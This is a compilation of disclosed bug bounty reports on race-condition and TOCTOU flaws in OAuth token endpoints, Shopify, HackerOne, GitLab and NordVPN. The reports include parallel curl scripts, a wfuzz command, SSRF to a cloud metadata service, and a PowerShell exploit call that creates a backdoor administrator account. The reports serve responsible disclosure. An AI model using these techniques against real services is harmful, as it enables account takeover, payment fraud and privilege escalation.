@@ -1,0 +1,1264 @@
+===== #55140 · Race Conditions in OAuth 2 API implementations
+   program: ibb · bounty: None · module: Account-ATO-and-Token-Races · full-body
+--- BODY ---
+Most of OAuth 2 API implementations seem to have multiple Race Condition vulnerabilities for processing requests for Access Token or Refresh Token.
+
+Race Condition allows a malicious application to obtain several `access_token` and `refresh_token` pairs while only one pair should be generated. Further, it leads to authorization bypass when access would be revoked.
+
+I've already tested for this vulnerability 11 different targets (web-services providing OAuth2 API), and 6 of them are vulnerable. Only one target seems to be certainly protected (or I just failed to catch into Race Condition time window). The rest 4 targets have Race Condition bug, but protected against further exploitation by one of the following reasons:
+* only one of several tokens generated is valid (**1 target**)
+* for any access revocation all tokens always are revoked (**1 target**)
+* for all concurring requests finished successfully the same `access_token` values (or in pair with `refresh_token`) obtained (**2 targets**)
+
+At this moment I cannot list vulnerable targets here because of responsible disclosure, but I think it would be possible to publish their names soon.
+
+Initially, I thought the vulnerability is located in [Doorkeeper gem for Ruby](https://github.com/doorkeeper-gem/doorkeeper). It is very popular, and I know that some of the vulnerable targets use this gem. To be clear, I tested [OAuth 2 provider example based on it](https://github.com/doorkeeper-gem/doorkeeper-provider-app) and it was safe for me. *Honestly, I'm not ruby developer, so it is not easy for me to quickly inspect doorkeeper's code and distinguish is it vulnerable or not*.
+
+However, I'm sure that 6 of vulnerable targets use different implementations (at least more than one). So the attack vector seems to be universal and possible by design.
+
+Race Condition for Access Token
+===============================
+According to [OAuth 2.0 RFC](https://tools.ietf.org/html/rfc6749), `code` obtained via callback may be used only once to generate `access_token` (and corresponding `refresh_token`).
+
+Race Condition vulnerability allows a malicious application to generate several `access_token` and `refresh_token` pairs. This leads to authentication issue when a user will revoke access for an application. One `access_token` and `refresh_token` pair would be revoked, but all the rest stay active.
+
+Proof-Of-Concept
+------------------------
+ *PoC description is unified and may be used for any provider*
+
+0) Register an application for using OAuth 2.0 API of the target provider. Obtain credentials for the application
+
+1) Open link for the application authorization in browser. Usually it looks like:
+```
+https://OAUTH_PROVIDER_DOMAIN/oauth/authorize?client_id=APPLICATION_ID&redirect_uri=https://APPLICATION_REDIRECT_URI&response_type=code
+```
+
+2) Log into *a victim's* account (if it needed) and allow access for the application
+
+3) Obtain `code` value from callback:
+```
+https://APPLICATION_REDIRECT_URI?code=AUTHORIZATION_CODE_VALUE
+```
+
+4) Try to exploit Race Condition for Access Token request. I used the following script for that:
+```
+#!/bin/bash
+curl --data "grant_type=authorization_code&code=AUTHORIZATION_CODE_VALUE&client_id=APPLICATION_ID&client_secret=[REDACTED_SECRET]" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &
+< ... previous line repeated 20 times ... >
+```
+
+For different attempts result of its execution gives from 1 to 20 different `access_token` values (may be in pair with `refresh_token` values) for targets which has Race Condition bug (10 of 11 tested).
+
+5) Check each `access_token`. Take the simplest request from the target API and try it for each value, like:
+```
+GET /api/me?access_token=[REDACTED_SECRET] HTTP/1.1
+Host: OAUTH_PROVIDER_DOMAIN
+
+```
+
+Usually all `access_token` values are valid and working.
+
+6) Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it. Attackers usually can generate some additional load to the server (not DoS, but many requests to vulnerable script) to increase the chance of successful exploitation.
+
+7) Here execution flow has two possible directions:
+7A) Go to **settings** or **applications** page in the victim's account and revoke access for the application. Then repeat step 5 and see if all `access_token`s become invalid or not. If all `access_token`s are invalid, It is good behavior despite successful Race Condition exploitation. Actually, in some cases only one `access_token` is revoked, while all the rest stay valid.
+
+7B) Use revocation request (like `/oauth/revoke`) for one of the `access_token`s. Then repeat step 5 and see that in this case only one token is revoked, while all the rest stay active (except one of the targets tested).
+
+
+Race Condition for Refresh Token
+--------------------------------
+While `code` may be used only once to obtain `access_token`, `refresh_token` often may be used only once too. In such case, Race Condition vulnerability allows an attacker to generate huge number of `access_token` and `refresh_token` pairs. This will make it very hard for a victim to revoke access for the malicious application.
+
+0) Register an application for using OAuth 2.0 API of the target provider. Obtain credentials for the application
+
+1) Open link for the application authorization in browser. Usually it looks like:
+```
+https://OAUTH_PROVIDER_DOMAIN/oauth/authorize?client_id=APPLICATION_ID&redirect_uri=https://APPLICATION_REDIRECT_URI&response_type=code
+```
+
+2) Log into *a victim's* account (if it needed) and allow access for the application
+
+3) Obtain `code` value from callback:
+```
+https://APPLICATION_REDIRECT_URI?code=AUTHORIZATION_CODE_VALUE
+```
+
+4) Legally obtain `access_token` and `refresh_token`. Usually it may be done by request like:
+```
+curl --data "grant_type=authorization_code&code=AUTHORIZATION_CODE_VALUE&client_id=APPLICATION_ID&client_secret=[REDACTED_SECRET]" "https://OAUTH_PROVIDER_DOMAIN/oauth/token"
+```
+
+5) Try to exploit Race Condition for `refresh_token`. I used the following script for that:
+```
+#!/bin/bash
+curl --data "grant_type=refresh_token&refresh_token=REFRESH_TOKEN_VALUE&client_id=APPLICATION_ID&client_secret=[REDACTED_SECRET]" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &
+< ... previous line repeated 20 times ... >
+
+```
+
+For different attempts result of its execution gives from 1 to 20 different `access_token` values (may be in pair with `refresh_token` values) for targets which has Race Condition bug.
+
+6) Check obtained `access_token`s as in previous Proof-of-Concept. All of them are valid and working for API.
+
+7) Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it. Attackers usually can generate some additional load to the server (not DoS, but many requests to vulnerable script) to increase the chance of successful exploitation.
+
+8) Here execution flow has two possible directions:
+8A) Go to **settings** or **applications** page in the victim's account and revoke access for the application. Then repeat step 5 and see if all `access_token`s become invalid or not. If all `access_token`s are invalid, It is good behavior despite successful Race Condition exploitation. Actually, in some cases only one `access_token` is revoked, while all the rest stay valid.
+
+8B) Use revocation request (like `/oauth/revoke`) for one of the `access_token`s. Then repeat step 5 and see that in this case only one token is revoked, while all the rest stay active (except one of the targets tested).
+
+
+Exploitation for `refresh_token` is more dangerous than for `access_token`, because there is no way for an attacker to fail. Each exploitation gives at least one new `refresh_token` which may be used further. Thus, number of token pairs grows exponentially.
+
+Impact
+======
+Generating huge number of tokens for access is serious issue which violates [OAuth framework RFC](https://tools.ietf.org/html/rfc6749) and best practices. This vulnerability deprives a victim of ability to deny access for malicious application (for most of implementations tested).
+
+Because of target (e.g `/oauth/token`) script is vulnerable to Race Condition, there are more attack vectors than I demonstrated. For example, an application may infinitely refresh its access and user would not be able to revoke access too.
+
+Put it simply
+-----------------
+OAuth API is widespread mechanism nowadays. Number of different services and applications increases so fast, that almost no one wants to have so many different accounts for all of them. This is why OAuth is popular and important. But, on the other hand, no one wants to grant access to yet another one service/application, if he knows that it is impossible for him to revoke deny access later. This is why such bypassing of access revocation should be prevented.
+===== #239359 · Timing attack woocommerce, simplify commerce gateway
+   program: automattic · bounty: None · module: Library-Timing-Adjacent · full-body
+--- BODY ---
+file `class-wc-gateway-simplify-commerce.php` method `return_handler` e.g. where woocommerce marks the order regarding its payment / transaction.
+
+```
+public function return_handler() {
+		@ob_clean();
+		header( 'HTTP/1.1 200 OK' );
+
+		if ( isset( $_REQUEST['reference'] ) && isset( $_REQUEST['paymentId'] ) && isset( $_REQUEST['signature'] ) ) {
+			$signature = strtoupper( md5( $_REQUEST['amount'] . $_REQUEST['reference'] . $_REQUEST['paymentId'] . $_REQUEST['paymentDate'] . $_REQUEST['paymentStatus'] . $this->private_key ) );
+			$order_id  = absint( $_REQUEST['reference'] );
+			$order     = wc_get_order( $order_id );
+
+			if ( $signature === $_REQUEST['signature'] ) {
+				$order_complete = $this->process_order_status( $order, $_REQUEST['paymentId'], $_REQUEST['paymentStatus'], $_REQUEST['paymentDate'] );
+
+				if ( ! $order_complete ) {
+					$order->update_status( 'failed', __( 'Payment was declined by Simplify Commerce.', 'woocommerce' ) );
+				}
+
+				wp_redirect( $this->get_return_url( $order ) );
+				exit();
+			}
+		}
+
+		wp_redirect( wc_get_page_permalink( 'cart' ) );
+		exit();
+	}
+```
+Here is used md5 for signature generation, but string comparison isn't safe towards timing attack. Having in mind the length of the md5 hash string 32 and minimal character set used for it `a-z` and `0-9`, then discovering the right signature will require 32 rounds * X requests per character => no need even for distributed attack regarding successful guessing the generated signature.
+
+In order to protect the customers and merchants I would like to point the usage of [hash_equals](http://php.net/manual/en/function.hash-equals.php) with its [wordpress alternative](https://developer.wordpress.org/reference/functions/hash_equals/) e.g.
+
+`... if (hash_equals($signature, $_REQUEST['signature'])) ...`
+===== #300305 · Ability to bypass partner email confirmation to take over any store given an employee email
+   program: shopify · bounty: 15250.0 · module: Account-ATO-and-Token-Races · full-body
+--- BODY ---
+I told Pete I would take a look at Spotify, hi Pete.
+
+**Summary**
+It's possible to take over any store account through partners given an employee email address. This is possible because I found a way to confirm arbitrary emails. I don't know the Shopify ecosystem well enough to know the other ramifications of such a bug.
+
+On #270981 you wrote:
+> The intention was that, when a partner already had a valid user account on the store, their collaborator account request could be accepted automatically, with the user account converted into a collaborator account.
+
+I tested that functionality and confirmed how it works. I realized that if you can somehow create a partner account with a business email that matched that of an employee, you would be able to take over their employee account, then convert it to a collaborator. The problem is that business accounts need emails to be validated, but this can be bypassed with a race condition.
+
+The bug works by hitting the email validation endpoint for an email you own, at the same time as changing your email to a victim's. It might take a few tries, but eventually your email will be changed and be validated due to not (properly) using a DB transaction.
+
+**Steps to reproduce**
+1. Create a store account and invite an employee.
+2. Accept the employee invite (maybe not necessary I didn't test).
+3. Login to or create a partner account as the attacker.
+4. Go to your partner settings page `https://partners.shopify.com/[ID]/settings` and change your email to something you own.
+5. Check your email and grab the confirmation link, but don't visit it yet.
+6. Go back to your partner account and change your email to that of the store employee from step 2, but intercept the request to not let it through yet.
+7. Now the tricky part. The "change email" takes anywhere from 1,100 - 2,500 ms to load so you need to take that into account. But let the request go through, wait for some milliseconds, then in another tab visit that email confirmation link from step 5.
+8. If done correctly you will now have confirmed an email you do not own.
+9. Visit `https://partners.shopify.com/[ID]/managed_stores`, add the store, and you now have access.
+
+As proof, look at the email for partner account `698396`. It will be confirmed `[REDACTED_EMAIL]`, which I obviously would never be able to validate otherwise.
+
+Thanks,
+-- Tanner
+
+## Impact
+
+Ability to take over stores, and possibly perform any other action that relies on a validated email as a security measure.
+===== #429026 · Race condition in performing retest allows duplicated payments
+   program: security · bounty: None · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+## Summary
+
+There exists a race condition in performing retests. By executing multiple requests to confirm a retest at the same time, a malicious user is paid multiple times for the retest. This allows for stealing money from HackerOne, which could go unnoticed by both HackerOne and the attacker (me).
+
+## Steps to Reproduce
+
+1. Receive a retest request email from HackerOne.
+2. Intercept the request to retest the email. Right click the request in Burp Suite and select `Copy as curl command`.
+3. Execute the request on the command line in the form `(request) & (request) & ...`. In testing, I executed the command 5 times.
+4. Scroll to the bottom of https://hackerone.com/settings/bounties. The payment will appear under the `Retest payments` sections and may be repeated.
+5. Wait a few weeks. If successful, a callback from HackerOne will be received (in this case from @michiel):
+
+    {F366191}
+
+6. Check your bank account statements. Observe that a $500 payment was sent from HackerOne 2 weeks ago, demonstrating that the race condition was successful:
+
+{F366192}
+
+## Impact
+
+This allows an attacker to exploit the retesting feature to steal many times more money. Given that this went unnoticed by both the attacker and HackerOne for over 2 weeks, this has the potential to be exploited multiple times to steal money from HackerOne.
+===== #454949 · Race Condition in Flag Submission
+   program: security · bounty: None · module: Financial-Credit-and-Ledger-Races · full-body
+--- BODY ---
+**Summary:**
+
+This report describes a Race Condition Vulnerability which allow an authenticated user to submit the same Flag multiple times. Increasing the user points and therefore the chances to get an invitation to a private program.
+
+### Steps To Reproduce
+To  reproduce this bug, you need to:
+1. Login with a valid user account
+2. Solve one of the challenges and get a Flag. It can be the Trivial one (worth 1 point).
+3. Go to the submit page, put the Flag that was found and intercept the POST request that is sent during the Flag submission. You can use Burp Suite for that, for example.
+4. Then, you just have to submit the POST several times in a short time frame. I recommend a script with multi threads or "Race The Web" tool that I will mention below.
+5. Enjoy your extra points with the same flag.
+
+### Tool Used During PoC
+To the PoC I used "Race The Web", available at: https://github.com/insp3ctre/race-the-web
+With this tool we can send the requests faster than we could with Burp Intruder. Getting better results. 
+
+### Supporting Material/References (Screenshots)
+The outcome is shown below:
+ {F385429}
+I've used the Trivial Flag 70 times and earned 2 invitations.
+
+### Note
+I've created a new user to do this PoC. In case you want to delete, the e-mail is: ███████
+
+## Impact
+
+An attacker could use this Race Condition vulnerability to earn extra points and increase the chances to get invited to a private program without the need to solve other chalanges available.
+===== #488985 · Race condition in claiming program credentials 
+   program: security · bounty: None · module: Membership-and-Invitation-Races · full-body
+--- BODY ---
+Hi,
+
+**Summary:**
+I was invited to a private program and I tried to get test credentials so a request as follows was sent to your server:
+
+```
+POST /graphql HTTP/1.1
+Host: hackerone.com
+Connection: close
+Content-Length: 778
+Accept: */*
+X-Auth-Token: ████
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Origin: https://hackerone.com
+Content-Type: application/json
+Referer: https://hackerone.com/█████
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,he;q=0.8
+Cookie: __cfduid=███████; _cfuid=███████; _ga=████; _mkto_trk=id:████████
+
+{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"team_id":"█████=","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}
+```
+
+and I then sent this request to burp suite intruder and got 22 responses , 21 of them had the same response as this:
+
+```
+{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"██████████","credentials":{"email":"██████","password":"███████","private_id":"██████"},"account_details":null},"id":"██████="},"was_successful":false,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
+```
+
+and the last one was holding a different set of credentials as this:
+
+```
+{"data":{"claimCredential":{"clientMutationId":"1","team":{"claimed_credential":{"id":"███████","credentials":{"email":"████████","password":"███████","private_id":"███"},"account_details":null},"id":"██████████="},"was_successful":true,"_errors4fkckF":{"edges":[],"pageInfo":{"hasNextPage":false,"hasPreviousPage":false}}}}}
+```
+
+in this case I was able to have multiple test credentials and maybe block another user from getting a test account if the program provided a limited amount of test accounts.
+
+
+thanks!
+
+## Impact
+
+claiming multiple credentials for the same user
+===== #541169 · GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery
+   program: gitlab · bounty: None · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+### Summary
+The `GitLab::UrlBlocker` IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.
+
+### Details
+The IP address validation code in `/lib/gitlab/url_blocker.rb` resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (`127.0.0.1`, `::1`, `169.254.0.0/16`, etc.) or returns `true` if the IP address do not match the block lists.
+```ruby
+  begin
+    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
+      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
+    end
+  rescue SocketError
+    return true
+  end
+
+  validate_localhost!(addrs_info) unless allow_localhost
+  validate_loopback!(addrs_info) unless allow_localhost
+  validate_local_network!(addrs_info) unless allow_local_network
+  validate_link_local!(addrs_info) unless allow_local_network
+
+  true
+end
+```
+If the address validates the `GitLab::HTTP` code then uses `HTTParty` to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. 
+
+In order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in {F470655}. Output of resolving `gitlabextssrf.webhooks.pw` against this DNS resolver configuration is shown below:
+```sh
+$ dig +noall +answer gitlabextssrf.webhooks.pw
+gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
+$ dig +noall +answer gitlabextssrf.webhooks.pw
+gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
+$ dig +noall +answer gitlabextssrf.webhooks.pw
+gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
+$ dig +noall +answer gitlabextssrf.webhooks.pw
+gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
+$ dig +noall +answer gitlabextssrf.webhooks.pw
+gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
+```
+Notice the alternating resolved IP address and 0 ttl.
+
+### Attack scenario
+Using the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to `http://169.254.169.254/metadata/v1.json` on a DigitalOcean droplet:
+{F470641}
+
+### Steps to reproduce
+To demonstrate this issue I have configured the domain `gitladextssrf.webhooks.pw` to randomly resolve to either `198.211.125.160` or `127.0.0.1`.
+
+1. Create a new repository
+1. Add a commit to the repository
+1. Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.
+  * This may take several attempts due to the random nature of the `gitlabextssrf.webhooks.pw` DNS resolver, if it fails with a `500` error, try again until it is accepted.
+1. Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. `nc -vvn -l -p 9999`)
+1. Perform numerous parallel requests to the Web Hook test endpoint. For this I use `wfuzz`
+
+```sh
+$ ./wfuzz -X POST \
+  -b "_gitlab_session=<session_id>;" \
+  -d "_method=post&authenticity_token=<token>" \
+  -z range,0-1000 \
+  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
+```
+The the below video demonstration of reproducing this issue:
+{F470642}
+
+After several requests a connection will be made to the local TCP listener on port 9999/tcp.
+
+### Impact
+This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.
+
+### What is the current *bug* behavior?
+The `GitLab::UrlBlocker` validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the `GitLab::HTTP` module which re-resolves the URL domain in order to perform the HTTP request.
+
+### What is the expected *correct* behavior?
+The validated resolved addresses should be returned by `GitLab::UrlBlocker` and used by `GitLab::HTTP` to make the TCP connection to the destination host.
+
+### Relevant logs and/or screenshots
+Output of using the ToCToU bypass in a Web Hook to send a request to the DigitalOcean droplet meta data API `http://169.254.169.254/metadata/v1.json` endpoint:
+{F470641}
+
+### Output of checks
+#### Results of GitLab environment info
+```sh
+$ gitlab-rake gitlab:env:info
+
+System information
+System:         Ubuntu 18.04
+Proxy:          no
+Current User:   git
+Using RVM:      no
+Ruby Version:   2.5.3p105
+Gem Version:    2.7.6
+Bundler Version:1.16.6
+Rake Version:   12.3.2
+Redis Version:  3.2.12
+Git Version:    2.18.1
+Sidekiq Version:5.2.5
+Go Version:     unknown
+
+GitLab information
+Version:        11.9.8-ee
+Revision:       c9701808101
+Directory:      /opt/gitlab/embedded/service/gitlab-rails
+DB Adapter:     postgresql
+DB Version:     9.6.11
+URL:            https://gitlabext.webhooks.pw
+HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git
+SSH Clone URL:  [REDACTED_EMAIL]:some-group/some-project.git
+Elasticsearch:  no
+Geo:            no
+Using LDAP:     no
+Using Omniauth: yes
+Omniauth Providers:
+
+GitLab Shell
+Version:        8.7.1
+Repository storage paths:
+- default:      /var/opt/gitlab/git-data/repositories
+GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
+Git:            /opt/gitlab/embedded/bin/git
+```
+
+I have confirmed this issue on both the official Docker image and the official `gitlab-ee` Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).
+
+## Impact
+
+This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.
+===== #604534 · Race Condition leads to undeletable group member
+   program: security · bounty: None · module: Membership-and-Invitation-Races · full-body
+--- BODY ---
+Hi,
+
+**Summary:**
+There exists a Race Condition in which the user can add themselves twice to a group which will make them unremovable from group. They themselves cannot remove themselves from the group as well as the group leader cannot remove that user from the group. Ofcourse this is a low severity as that malicious user first needs to have a valid invitation link, but nevertheless this leads to permanent membeship of group so this needs to be fixed in my opinion.
+
+
+### Steps To Reproduce
+
+We need two accounts to reproduce this.
+
+- First account will be leader account
+- Second account will be a normal account.
+
+- Create a group from the first account and create an invitation link.
+- Join using the invitation link on the second account and intercept the request:
+
+```
+POST /group/post_join HTTP/1.1
+Host: ctf.hacker101.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+Connection: close
+Cookie: COOKIES
+Upgrade-Insecure-Requests: 1
+
+csrf=391aecf0c3125e90c437d04c18204ab6&invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
+```
+
+Repeat the above requests in parallel. I did it for 5 parallel requests and I was able to add myself 2 times to that group:
+{F505223}
+
+- Now try deleting the user from first account(group leader). No matter how much you try, you won't be able to delete it.
+
+This would lead to a state where the group leader will have to delete the group and create a new group if he wants the malicious user to get removed. 
+
+Thanks,
+Yash
+
+## Impact
+
+Irremovable/permanent member of the group. Even the group leader cannot remove that user.
+===== #768110 · Race condition (TOCTOU) in NordVPN can result in local privilege escalation
+   program: nordsecurity · bounty: None · module: Check-Use-and-File-System-Races · full-body
+--- BODY ---
+## Summary:
+A vulnerability exists in the NordVPN service, which is installed as part of the NordVPN Windows app. By exploiting a race condition in the NordVPN service it is possible to launch OpenVPN with a user-supplied configuration file. By setting an OpenSSL engine name within this configuration file, it is possible to cause OpenVPN to load an arbitrary DLL. The NordVPN service is running with SYSTEM privileges and is responsible for starting the OpenVPN process. Consequently, the code in the attacker's DLL will also run with SYSTEM privileges.
+
+This issue exists because it is possible to pass the NordVPN service an arbitrary path via the `DomainName` parameter. The service will use the domain name to construct a path to the location of a OpenVPN configuration file. The configuration file is validated before starting OpenVPN. If the path is controlled by a local attacker it is possible to trigger a race condition. In the time after the validation of the NordVPN service and before starting OpenVPN, it is possible to switch the validated configuration with a different one containing configuration options that are normally not allowed.
+
+## Steps To Reproduce:
+Attached PowerShell Module can be used to exploit this issue. Example usage:
+
+```
+Import-Module .\Invoke-ExploitNordVPNConfigLPE.psd1
+Invoke-ExploitNordVPNConfigLPE "net user backdoor P@ssword /add" "net localgroup administrators backdoor /add"## Supporting 
+```
+
+## Vulnerability details:
+NordVPN 6.26.8.0 mitigates a different local privilege escalation vulnerability by removing the `engine` option from the whitelist with allowed OpenVPN options. No validation of the `ServerDomain` parameter of the `VpnConnectionProxy` WCF model was added to prevent the loading of OpenVPN configuration files from arbitrary locations.
+
+A time-of-check-time-of-use (TOCTOU) race condition exists in the way OpenVPN configuration files are validated/used. First the NordVPN service will validate the OpenVPN configuration that is located at the path that is constructed using the `ServerDomain` parameter. If the configuration file is valid, OpenVPN is launched with the same path. In the time between the validation and launching, the configuration file can be swapped for another one, and OpenVPN will used that file instead of the one that was validated by the NordVPN service.
+
+NTFS [opportunistic locks](https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks) can be used to exploit this issue by detecting that a process is accessing a certain file. When this occurs, the file can be swapped for another file. The second read will thus return different content. The [BaitAndSwitch](https://github.com/googleprojectzero/symboliclink-testing-tools/releases) from [James Forshaw](https://twitter.com/tiraniddo) does exactly this and can be used to exploit this issue.
+
+## Possible fix(es):
+- Perform strict validation of the `ServerDomain` parameter.
+- Copy the OpenVPN configuration file to a folder that is only accessible by the SYSTEM user. Give the configuration file a unique (random) name and validate it after the file has been copied. Start OpenVPN with the configuration file from this path.
+- After constructing the path  with `Path.Combine()` validate if the path starts with the value of `PrebundledOpenVpnConfig.BundleDirectory()`.
+
+## Impact
+
+A local low privileged user can exploit this issue to run arbitrary code with LocalSystem privileges.
+===== #772886 · Password Reset Link Works Multiple Times
+   program: nordsecurity · bounty: None · module: Account-ATO-and-Token-Races · full-body
+--- BODY ---
+## Background: 
+Normally, a secure way to handle password reset links is to invalidate the link/token upon usage. Additionally, if multiple reset links are requested, older & unused tokens should also be invalidated (i.e., if 2 reset tokens were requested, the 2nd token should be invalid upon your usage of the 1st token, or vice versa). This appears to be working properly for NordVPN; however, there is an interesting bypass to this technique which causes some weird back-end issues for the user, not allowing them to log out of their account or send additional reset links.
+
+## Summary:
+It appears as though NordVPN uses two methods at two different endpoints (i.e., `/change-password/` and `/reset-password/`) to reset a user's password. By combining both methods, you are able to use multiple valid password reset tokens for one single account. Upon successful password change the 2nd time, the user is greeted with a `403 - Forbidden` message, disallowing them to logout or send additional reset links -- causing an inability to use the account until an IP address change and browser reset occur. That being said, here are a little more details on the methods for the reset tokens: 
+
+**Method 1**
+While _authenticated_, login to your account navigate to `Change password` and request a link. In your email, your link will be as:  
+ * https://ucp.nordvpn.com/change-password/TOKEN/
+
+**Method 2**
+While unauthenticated, simply select `Forgot your password?` on https://ucp.nordvpn.com/. In your email, your link will be as: 
+ * https://ucp.nordvpn.com/reset-password/DIFFERENT-TOKEN/
+
+## Steps To Reproduce:
+**Manual PoC**
+  1. First, login to your account and navigate to the `Change Password` and select `Send Reset Link`. (**F682723**)
+  1. Logout of your account and navigate to https://ucp.nordvpn.com/login.
+  1. Select `Forgot your password?` and place in your email address. (**F682738**)
+  1. You should now have two emails from NordVPN which mention to reset your password. 
+  1. Follow both links, open them in two different tabs, and make special note of the difference in endpoints (i.e., one is `/reset-password/` and the other is `/change-password/`). 
+  1. Enter a new password into the first link (my password was "33333333"). In my case it was this endpoint: https://ucp.nordvpn.com/change-password/TOKEN/ that I used first.
+  1. Login and verify your password has changed. 
+  1. Logout and navigate to the second browser tab with the https://ucp.nordvpn.com/reset-password/DIFFERENT-TOKEN/ still up.
+  1. Change the password to something else. My new password was "77777777". 
+  1. Make note that you will probably hit several errors:  **1** - 429 (too many requests), **2** - 403 (forbidden), and **3** - "Something went wrong".
+  1. Change your IP address, in my case I was already using a VPN and just selected a new location.
+  1. After my IP address changed, I was able to reset the password successfully and verified that my new password was now the one I used for my 2nd token, "77777777".
+
+> _Note:_ After Step 6, you want to make sure that both screens have `New Password` and `Confirm Password`, rather than back at the email login screen (i.e., `Username or email address` and `Password` is what you don't want to see for either of the links you followed).
+
+**Video PoC with timestamp descriptions**
+ {F682727}
+  1. 0:02 - 0:17 -- creating a new password (33333333) and logging in.
+  1. 0:23 -- navigated to the second token endpoint `/reset-password/`
+  1. 0:29 -- 403 error, which means you are typically forbidden from whatever action you are trying to perform
+  1. 0:31 -- attempted to send the request multiple times as a Hail Mary for a potential Race Condition
+  1. 0:45 -- I put "3333" at the end of my username to show this was the prior password from the 1st reset link -- which, at this point should log me in since I was greeted ever-so kindly by the 403 error.
+  1. 0:50 -- logged in with password "33333333" from the 1st reset link. 
+  1. 0:54 - 0:57 -- now got a 429 and 403 response. This is what I want in order to bypass the restriction.
+  1. 1:20 - 1:23 -- reset my IP address and tried again with password "77777777".
+  1. 1:24 -- notice I now have no errors and get redirected back to the main login page. If all went well, I should now be able to login with "77777777" and **not** "33333333". 
+  1. 1:36 - 2:11 -- attempting to login with the new password of "77777777" along with the old password of "33333333" and received the **Something went wrong error**.
+  1. 2:15 -- the interesting part here is that I got two hits for password resets, noted by two separate emails from NordVPN. One from the `/change-password/` token and the other from the `/reset-password/` token.
+  1. 2:30 - 2:41 -- logging in with the password of "77777777", which shouldn't have worked since the token should be invalid, and I was hit with multiple error messages.
+
+## Asset Affected:
+https://ucp.nordvpn.com/login endpoints:
+  * `/reset-password/`
+  * `/change-password/`
+
+## Supporting Material/References:
+
+**Authenticated password change:**
+  * {F682723}
+
+**403 error while trying to logout**
+  * {F682724}
+
+**Unauthenticated password change**
+  * {F682738}
+
+**Unable to Logout after using both links (video):**
+  * {F682726}
+
+**Video PoC**
+  * {F682727}
+
+**Vulnerability Reference [Table](https://bugcrowd.com/vulnerability-rating-taxonomy)**
+
+| Potential Rating  | Category  | Issue  | Description  |   |
+|---|---|---|---|---|
+| P4  |  Broken Authentication and Session Management |  Failure to Invalidate Session |  On Password Reset and/or Change |   |
+|   |   |   |   |   |
+
+**Similar Reports:**
+https://hackerone.com/reports/283550
+https://hackerone.com/reports/576510
+
